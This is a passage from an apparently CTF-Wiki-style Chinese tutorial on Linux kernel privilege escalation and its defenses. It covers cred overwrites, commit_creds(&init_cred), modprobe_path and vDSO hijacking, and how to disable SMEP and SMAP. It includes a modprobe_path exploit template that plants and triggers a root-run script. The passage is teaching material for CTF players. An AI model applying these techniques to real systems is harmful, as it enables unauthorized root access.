title="修改"></a>修改</h5><p>在这种方法下，我们可以直接将 cred 中的 uid-fsgid 都修改为 0。当然修改的方式有很多种，比如说</p><ul><li>在具有任意地址读写后，可以直接修改 cred。</li><li>在可以 ROP 执行代码后，可以利用 ROP gadget 修改 cred。</li></ul><h5 id="间接定位修改"><a href="#间接定位修改" class="headerlink" title="间接定位修改"></a>间接定位修改</h5><p>虽然确实想要修改 cred 的内容，但是不一定非得知道 cred 的具体位置，只需要能够修改 cred 即可。</p><p><strong>(已过时)UAF 使用同样堆块</strong> </p><p>如果在进程初始化时能控制 cred 结构体的位置，并且可以在初始化后修改该部分的内容，那么就可以很容易地达到提权的目的。这里给出一个典型的例子</p><ol><li>申请一块与 cred 结构体大小一样的堆块</li><li>释放该堆块</li><li>fork 出新进程，恰好使用刚刚释放的堆块</li><li>此时，修改 cred 结构体特定内存，从而提权</li></ol><p>但是<strong>此种方法在较新版本内核中已不再可行，我们已无法直接分配到 cred_jar 中的 object</strong>，这是因为 cred_jar 在创建时设置了 <code>SLAB_ACCOUNT</code> 标记，在 <code>CONFIG_MEMCG_KMEM=y</code> 时（默认开启）<strong>cred_jar 不会再与相同大小的 kmalloc-192 进行合并</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __init <span class="title function_">cred_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* allocate a slab in which we can store credentials */</span></span><br><span class="line">    cred_jar = kmem_cache_create(<span class="string">&quot;cred_jar&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> cred), <span class="number">0</span>,</span><br><span class="line">            SLAB_HWCACHE_ALIGN|SLAB_PANIC|SLAB_ACCOUNT, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="修改-cred-指针"><a href="#修改-cred-指针" class="headerlink" title="修改 cred 指针"></a>修改 cred 指针</h4><h5 id="定位具体位置-1"><a href="#定位具体位置-1" class="headerlink" title="定位具体位置"></a>定位具体位置</h5><p>在这种方式下，需要知道 cred 指针的具体地址。</p><h6 id="直接定位"><a href="#直接定位" class="headerlink" title="直接定位"></a>直接定位</h6><p>显然，cred 指针并没有什么非常特殊的地方，所以很难通过直接定位的方式定位到 cred 指针。</p><h6 id="间接定位"><a href="#间接定位" class="headerlink" title="间接定位"></a>间接定位</h6><p><strong>task_struct</strong></p><p>进程的 <code>task_struct</code> 结构体中会存放指向 cred 的指针，因此可以</p><ol><li>定位当前进程 <code>task_struct</code> 结构体的地址</li><li>根据 cred 指针相对于 task_struct 结构体的偏移计算得出 <code>cred</code> 指针存储的地址</li></ol><p><strong>common</strong></p><p>comm 用来标记可执行文件的名字，位于进程的 <code>task_struct</code> 结构体中。可以发现 comm 其实在 cred 指针的正下方，所以也可以先定位 comm ，然后定位 cred 指针的地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/* Process credentials: */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Tracer&#x27;s credentials at attach: */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>     *<span class="title">ptracer_cred</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>     *<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>     *<span class="title">cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="comment">/* Cached requested key. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>          *<span class="title">cached_requested_key</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * executable name, excluding path.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * - normally initialized setup_new_exec()</span></span><br><span class="line"><span class="comment">     * - access it with [gs]et_task_comm()</span></span><br><span class="line"><span class="comment">     * - lock it with task_lock()</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">char</span>                comm[TASK_COMM_LEN];</span><br></pre></td></tr></table></figure><p>然而，在进程名字并不特殊的情况下，内核中可能会有多个同样的字符串，这会影响搜索的正确性与效率。因此，可以使用 prctl 设置进程的 comm 为一个特殊的字符串，然后再开始定位 comm。</p><h5 id="修改-1"><a href="#修改-1" class="headerlink" title="修改"></a>修改</h5><p>在具体修改时，我们可以使用如下的两种方式</p><ul><li>修改 cred 指针为内核镜像中已有的 init_cred 的地址。这种方法适合于能够直接修改 cred 指针以及知道 init_cred 地址的情况。</li><li>伪造一个 cred，然后修改 cred 指针指向该地址即可。这种方式比较麻烦，一般并不使用。</li></ul><hr><h6 id="commit-creds-amp-init-cred"><a href="#commit-creds-amp-init-cred" class="headerlink" title="commit_creds(&amp;init_cred)"></a>commit_creds(&amp;init_cred)</h6><p><code>commit_creds()</code> 函数被用以将一个新的 cred 设为当前进程 task_struct 的 real_cred 与 cred 字段，因此若是能够劫持内核执行流调用该函数并传入一个具有 root 权限的 cred，则能直接完成对当前进程的提权工作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">commit_creds</span><span class="params">(<span class="keyword">struct</span> cred *new)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span> =</span> current;<span class="comment">//内核宏，用以从 percpu 段获取当前进程的 PCB</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span> =</span> task-&gt;real_cred;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    rcu_assign_pointer(task-&gt;real_cred, new);</span><br><span class="line">    rcu_assign_pointer(task-&gt;cred, new);</span><br></pre></td></tr></table></figure><p>在内核初始化过程当中会以 root 权限启动 <code>init</code> 进程，其 cred 结构体为<strong>静态定义</strong>的 <code>init_cred</code>，由此不难想到的是可以通过 <code>commit_creds(&amp;init_cred)</code> 来完成提权的工作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The initial credentials for the initial task</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> <span class="title">init_cred</span> =</span> &#123;</span><br><span class="line">    .usage          = ATOMIC_INIT(<span class="number">4</span>),</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    .subscribers        = ATOMIC_INIT(<span class="number">2</span>),</span><br><span class="line">    .magic          = CRED_MAGIC,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    .uid            = GLOBAL_ROOT_UID,</span><br><span class="line">    .gid            = GLOBAL_ROOT_GID,</span><br><span class="line">    .suid           = GLOBAL_ROOT_UID,</span><br><span class="line">    .sgid           = GLOBAL_ROOT_GID,</span><br><span class="line">    .euid           = GLOBAL_ROOT_UID,</span><br><span class="line">    .egid           = GLOBAL_ROOT_GID,</span><br><span class="line">    .fsuid          = GLOBAL_ROOT_UID,</span><br><span class="line">    .fsgid          = GLOBAL_ROOT_GID,</span><br><span class="line">    .securebits     = SECUREBITS_DEFAULT,</span><br><span class="line">    .cap_inheritable    = CAP_EMPTY_SET,</span><br><span class="line">    .cap_permitted      = CAP_FULL_SET,</span><br><span class="line">    .cap_effective      = CAP_FULL_SET,</span><br><span class="line">    .cap_bset       = CAP_FULL_SET,</span><br><span class="line">    .user           = INIT_USER,</span><br><span class="line">    .user_ns        = &amp;init_user_ns,</span><br><span class="line">    .group_info     = &amp;init_groups,</span><br><span class="line">    .ucounts        = &amp;init_ucounts,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h6 id="（已过时）-commit-creds-prepare-kernel-cred-0"><a href="#（已过时）-commit-creds-prepare-kernel-cred-0" class="headerlink" title="（已过时） commit_creds(prepare_kernel_cred(0))"></a>（已过时） commit_creds(prepare_kernel_cred(0))</h6><p>在内核当中提供了 <code>prepare_kernel_cred()</code> 函数用以拷贝指定进程的 cred 结构体，当传入的参数为 NULL 时，该函数会拷贝 <code>init_cred</code> 并返回一个有着 root 权限的 cred：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> cred *<span class="title function_">prepare_kernel_cred</span><span class="params">(<span class="keyword">struct</span> task_struct *daemon)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">    new = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!new)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    kdebug(<span class="string">&quot;prepare_kernel_cred() alloc %p&quot;</span>, new);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (daemon)</span><br><span class="line">        old = get_task_cred(daemon);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        old = get_cred(&amp;init_cred);</span><br></pre></td></tr></table></figure><p>不难想到的是若是我们可以在内核空间中调用 <code>commit_creds(prepare_kernel_cred(NULL))</code>，则也能直接完成提权的工作</p><p><img src="https://ctf-wiki.org/pwn/linux/kernel-mode/aim/privilege-escalation/figure/elevation-of-privilege.png" alt="72b919b7-87bb-4312-97ea-b59fe4690b2e"></p><p>不过自从内核版本 6.2 起，<code>prepare_kernel_cred(NULL)</code> 将<strong>不再拷贝 init_cred，而是将其视为一个运行时错误并返回 NULL</strong>，这使得这种提权方法<strong>无法再应用于 6.2 及更高版本的内核：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> cred *<span class="title function_">prepare_kernel_cred</span><span class="params">(<span class="keyword">struct</span> task_struct *daemon)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (WARN_ON_ONCE(!daemon))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    new = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!new)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><h3 id="Change-Others"><a href="#Change-Others" class="headerlink" title="Change Others"></a>Change Others</h3><p>如果可以改变特权进程的执行轨迹，也可以实现提权。从以下角度来考虑如何改变特权进程的执行轨迹。</p><ul><li>改数据</li><li>改代码</li></ul><h4 id="改数据"><a href="#改数据" class="headerlink" title="改数据"></a>改数据</h4><p>这里给出几种通过改变特权进程使用的数据来进行提权的方法。</p><h5 id="符号链接"><a href="#符号链接" class="headerlink" title="符号链接"></a>符号链接</h5><p>如果一个 root 权限的进程会执行一个符号链接的程序，并且该符号链接或者符号链接指向的程序可以由攻击者控制，攻击者就可以实现提权。</p><h5 id="call-usermodehelper"><a href="#call-usermodehelper" class="headerlink" title="call_usermodehelper"></a>call_usermodehelper</h5><p><code>call_usermodehelper</code> 是一种内核线程执行用户态应用的方式，并且启动的进程具有 root 权限。因此，如果我们能够控制具体要执行的应用，那就可以实现提权。在内核中，<code>call_usermodehelper</code> 具体要执行的应用往往是由某个变量指定的，因此只需要想办法修改掉这个变量即可。不难看出，这是一种典型的数据流攻击方法。一般常用的主要有以下几种方式。</p><h6 id="修改-modprobe-path"><a href="#修改-modprobe-path" class="headerlink" title="修改 modprobe_path"></a>修改 modprobe_path</h6><p>修改 modprobe_path 实现提权的基本流程如下</p><ol><li>获取 modprobe_path 的地址。</li><li>修改 modprobe_path 为指定的程序。</li><li>触发执行<code>call_modprobe</code>，从而实现提权 。这里我们可以利用以下几种方式来触发<ol><li>执行一个非法的可执行文件。非法的可执行文件需要满足相应的要求（参考 call_usermodehelper 部分的介绍）。</li><li>使用未知协议来触发。</li></ol></li></ol><p>这里我们也给出使用 modprobe_path 的模板。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// step 1. modify modprobe_path to the target value</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// step 2. create related file</span></span><br><span class="line">system(<span class="string">&quot;echo -ne &#x27;#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag\ncat flag&#x27; &gt; /home/pwn/catflag.sh&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /home/pwn/catflag.sh&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// step 3. trigger it using unknown executable</span></span><br><span class="line">system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/pwn/dummy&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /home/pwn/dummy&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/home/pwn/dummy&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// step 3. trigger it using unknown protocol</span></span><br><span class="line">socket(AF_INET,SOCK_STREAM,<span class="number">132</span>);</span><br></pre></td></tr></table></figure><p>在这个过程中，我们着重关注下如何定位 modprobe_path。</p><p><strong>直接定位</strong> </p><p>由于 modprobe_path 的<strong>取值是确定</strong>的，所以可以直接扫描内存，寻找对应的字符串。这需要具有扫描内存的能力。</p><p><strong>间接定位</strong></p><p>考虑到 modprobe_path 相对于内核基地址的偏移是固定的，我们可以先获取到内核的基地址，然后根据相对偏移来得到 modprobe_path 的地址。</p><h5 id="修改-poweroff-cmd"><a href="#修改-poweroff-cmd" class="headerlink" title="修改 poweroff_cmd"></a>修改 poweroff_cmd</h5><ol><li>修改 poweroff_cmd 为指定的程序。</li><li>劫持控制流执行 <code>__orderly_poweroff</code>。</li></ol><p>关于如何定位 poweroff_cmd，可以采用类似于定位 <code>modprobe_path</code> 的方法。</p><h4 id="改代码"><a href="#改代码" class="headerlink" title="改代码"></a>改代码</h4><p>在程序运行时，如果我们可以修改 root 权限进程执行的代码，那其实我们也可以实现提权。</p><h5 id="修改-vDSO-代码"><a href="#修改-vDSO-代码" class="headerlink" title="修改 vDSO 代码"></a>修改 vDSO 代码</h5><p>内核中 vDSO 的代码会被映射到所有的用户态进程中。如果有一个高特权的进程会周期性地调用 vDSO 中的函数，那我们可以考虑把 vDSO 中相应的函数修改为特定的 shellcode。当高权限的进程执行相应的代码时，我们就可以进行提权。</p><p>在早期的时候，Linux 中的 vDSO 是可写的，考虑到这样的风险，Kees Cook 提出引入 <code>post-init read-only</code> 的数据，即将那些初始化后不再被写的数据标记为只读，来防御这样的利用。</p><p>在引入之前，vDSO 对应的 raw_data 只是标记了对齐属性。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(outfile, <span class="string">&quot;/* AUTOMATICALLY GENERATED -- DO NOT EDIT */\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(outfile, <span class="string">&quot;#include &lt;linux/linkage.h&gt;\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(outfile, <span class="string">&quot;#include &lt;asm/page_types.h&gt;\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(outfile, <span class="string">&quot;#include &lt;asm/vdso.h&gt;\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(outfile, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(outfile,</span><br><span class="line">    <span class="string">&quot;static unsigned char raw_data[%lu] __page_aligned_data = &#123;&quot;</span>,</span><br><span class="line">    mapping_size);</span><br></pre></td></tr></table></figure><p>引入之后，vDSO 对应的 raw_data 则被标记为了初始化后只读。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(outfile, <span class="string">&quot;/* AUTOMATICALLY GENERATED -- DO NOT EDIT */\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(outfile, <span class="string">&quot;#include &lt;linux/linkage.h&gt;\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(outfile, <span class="string">&quot;#include &lt;asm/page_types.h&gt;\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(outfile, <span class="string">&quot;#include &lt;asm/vdso.h&gt;\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(outfile, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(outfile,</span><br><span class="line">    <span class="string">&quot;static unsigned char raw_data[%lu] __ro_after_init __aligned(PAGE_SIZE) = &#123;&quot;</span>,</span><br><span class="line">    mapping_size);</span><br></pre></td></tr></table></figure><p>通过修改 vDSO 进行提权的基本方式如下</p><ul><li>定位 vDSO</li><li>修改 vDSO 的特定函数为指定的 shellcode</li><li>等待触发执行 shellcode</li></ul><p>这里着重关注下如何定位 vDSO。</p><h6 id="ida-里定位"><a href="#ida-里定位" class="headerlink" title="ida 里定位"></a>ida 里定位</h6><p>这里我们介绍一下如何在 vmlinux 中找到 vDSO 的位置。</p><ol><li>在 ida 里定位 init_vdso 函数的地址</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">init_vdso</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  init_vdso_image(&amp;vdso_image_64 + <span class="number">0x20000000</span>);</span><br><span class="line">  init_vdso_image(&amp;vdso_image_x32 + <span class="number">0x20000000</span>);</span><br><span class="line">  cpu_maps_update_begin();</span><br><span class="line">  on_each_cpu((<span class="type">char</span> *)startup_64 + <span class="number">0x100003EA0</span>LL, <span class="number">0LL</span>, <span class="number">1LL</span>);</span><br><span class="line">  _register_cpu_notifier(&amp;sdata + <span class="number">536882764</span>);</span><br><span class="line">  cpu_maps_update_done();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>可以看到 <code>vdso_image_64</code> 和 <code>vdso_image_x32</code>。以<code>vdso_image_64</code> 为例，点到该变量的地址</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.rodata:FFFFFFFF81A01300                 public vdso_image_64</span><br><span class="line">.rodata:FFFFFFFF81A01300 vdso_image_64   dq offset raw_data      ; DATA XREF: arch_setup_additional_pages+18↑o</span><br><span class="line">.rodata:FFFFFFFF81A01300                                         ; init_vdso+1↓o</span><br></pre></td></tr></table></figure><ol><li>点击 <code>raw_data</code> 即可知道 64 位 vDSO 在内核镜像中的地址，可以看到，vDSO 确实是以页对齐的。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.data:FFFFFFFF81E04000 raw_data        db  7Fh ;       ;DATAXREF:.rodata:vdso_image_64↑o</span><br><span class="line">.data:FFFFFFFF81E04001                 db  45h ; E</span><br><span class="line">.data:FFFFFFFF81E04002                 db  4Ch ; L</span><br><span class="line">.data:FFFFFFFF81E04003                 db  46h ; F</span><br></pre></td></tr></table></figure><p>从最后的符号来看，也可以直接使用 <code>raw_data</code> 来寻找 vDSO。</p><h6 id="内存中定位"><a href="#内存中定位" class="headerlink" title="内存中定位"></a>内存中定位</h6><p><strong>直接定位</strong></p><p>vDSO 其实是一个 ELF 文件，<u>具有 ELF 文件头</u>。同时，vDSO 中特定位置存储着导出函数的字符串。因此我们可以根据这两个特征来扫描内存，定位 vDSO 的位置。</p><p><strong>间接定位</strong></p><p>考虑到 <strong>vDSO 相对于内核基地址的偏移是固定的</strong>，我们可以先获取到内核的基地址，然后根据相对偏移来得到 vDSO 的地址。</p><h1 id="CTF-kernel-defense"><a href="#CTF-kernel-defense" class="headerlink" title="CTF kernel defense"></a>CTF kernel defense</h1><h2 id="Isolation"><a href="#Isolation" class="headerlink" title="Isolation"></a>Isolation</h2><p>在内核的防御机制中，根据隔离的主体，将隔离分为两种</p><ul><li>内核态和用户态的隔离</li><li>内核自身内部不同对象间的隔离</li></ul><h3 id="User-and-Kernel"><a href="#User-and-Kernel" class="headerlink" title="User and Kernel"></a>User and Kernel</h3><ul><li>默认：用户态不可直接访问内核态的数据、执行内核态的代码</li><li>SMEP：内核态不可执行用户态的代码</li><li>SMAP：内核态不可访问用户态的数据</li><li>KPTI：用户态不可看到内核态的页表；内核态不可执行用户态的代码（模拟）</li></ul><h4 id="用户代码不可执行"><a href="#用户代码不可执行" class="headerlink" title="用户代码不可执行"></a>用户代码不可执行</h4><p>起初，在内核态执行代码时，可以直接执行用户态的代码。那如果攻击者控制了内核中的执行流，就可以执行处于用户态的代码。由于用户态的代码是攻击者可控的，所以更容易实施攻击。为了防范这种攻击，研究者提出当位于内核态时，不能执行用户态的代码。在 Linux 内核中，<strong>这个防御措施的实现是与指令集架构相关的。</strong></p><h5 id="x86-SMEP-Supervisor-Mode-Execution-Protection"><a href="#x86-SMEP-Supervisor-Mode-Execution-Protection" class="headerlink" title="x86 - SMEP - Supervisor Mode Execution Protection"></a>x86 - SMEP - Supervisor Mode Execution Protection</h5><p>x86 下对应的保护机制的名字为 SMEP。<strong>CR4 寄存器中的第 20 位</strong>用来标记是否开启 SMEP 保护。</p><p><img src="https://ctf-wiki.org/pwn/linux/kernel-mode/defense/isolation/user-kernel/figure/cr4.png" alt=""></p><p>默认情况下，SMEP 保护是开启的。</p><p>如果是使用 qemu 启动的内核，可以在 <code>-append</code> 选项中添加 <code>+smep</code> 来开启 SMEP。</p><p>如果要关闭</p><p>在 <code>/etc/default/grub</code> 的如下两行中添加 nosmep</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GRUB_CMDLINE_LINUX_DEFAULT=&quot;quiet&quot;  </span><br><span class="line">GRUB_CMDLINE_LINUX=&quot;initrd=/install/initrd.gz&quot;</span><br></pre></td></tr></table></figure><p>然后运行 <code>update-grub</code> 并且重启系统就可以关闭 smep。</p><p>如果是使用 qemu 启动的内核，我们可以在 <code>-append</code> 选项中添加 <code>nosmep</code> 来关闭 SMEP。</p><p>通过如下命令可以检查 SMEP 是否开启，如果发现了 smep 字符串就说明开启了 smep 保护，否则没有开启。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep smep /proc/cpuinfo</span><br></pre></td></tr></table></figure><h6 id="Attack-SMEP"><a href="#Attack-SMEP" class="headerlink" title="Attack SMEP"></a>Attack SMEP</h6><p>把 CR4 寄存器中的第 20 位置为 0 后，就可以执行用户态的代码。一般而言，我们会使用 0x6f0 来设置 CR4，这样 SMAP 和 SMEP 都会被关闭。</p><p>内核中修改 cr4 的代码最终会调用到 <code>native_write_cr4</code>，当我们能够劫持控制流后，我们可以执行内核中的 gadget 来修改 CR4。从另外一个维度来看，<strong>内核中存在固定的修改 cr4 的代码</strong>，比如在 <code>refresh_pce</code> 函数、<code>set_tsc_mode</code> 等函数里都有。</p><h5 id="ARM-PXN"><a href="#ARM-PXN" class="headerlink" title="ARM - PXN"></a>ARM - PXN</h5><p>ARM架构下的用户代码不可执行技术称为PXN</p><h4 id="用户数据不可访问"><a href="#用户数据不可访问" class="headerlink" title="用户数据不可访问"></a>用户数据不可访问</h4><p>如果内核态可以访问用户态的数据，也会出现问题。比如在劫持控制流后，攻击者可以通过栈迁移将栈迁移到用户态，然后进行 ROP，进一步达到提权的目的。在 Linux 内核中，这个防御措施的实现是与指令集架构相关的。</p><h5 id="x86-SMAP-Supervisor-Mode-Access-Protection"><a href="#x86-SMAP-Supervisor-Mode-Access-Protection" class="headerlink" title="x86 - SMAP - Supervisor Mode Access Protection"></a>x86 - SMAP - Supervisor Mode Access Protection</h5><p>x86 下对应的保护机制的名字为 SMAP。CR4 寄存器中的第 21 位用来标记是否开启 SMEP 保护。</p><p>默认情况下，SMAP 保护是开启的。</p><p>如果是使用 qemu 启动的内核，我们可以在 <code>-append</code> 选项中添加 <code>+smap</code> 来开启 SMAP。</p><p>如果需要关闭</p><p>在 <code>/etc/default/grub</code> 的如下两行中添加 nosmap</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GRUB_CMDLINE_LINUX_DEFAULT=&quot;quiet&quot;  </span><br><span class="line">GRUB_CMDLINE_LINUX=&quot;initrd=/install/initrd.gz&quot;</span><br></pre></td></tr></table></figure><p>然后运行 <code>update-grub</code> ，重启系统就可以关闭 smap。</p><p>如果是使用 qemu 启动的内核，可以在 <code>-append</code> 选项中添加 <code>nosmap</code> 来关闭 SMAP。</p><p>通过如下命令可以检查 SMAP 是否开启，如果发现了 smap 字符串就说明开启了 smap 保护，否则没有开启。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep smap /proc/cpuinfo</span><br></pre></td></tr></table></figure><h6 id="Attack-SMEP-1"><a href="#Attack-SMEP-1" class="headerlink" title="Attack SMEP"></a>Attack SMEP</h6><p>这里给出几种方式。</p><p><strong>设置 CR4 寄存器</strong> </p><p>把 CR4 寄存器中的第 21 位置为 0 后，我们就可以访问用户态的数据。一般而言，我们会使用 0x6f0 来设置 CR4，这样 SMAP 和 SMEP 都会被关闭。</p><p>内核中修改 cr4 的代码最终会调用到 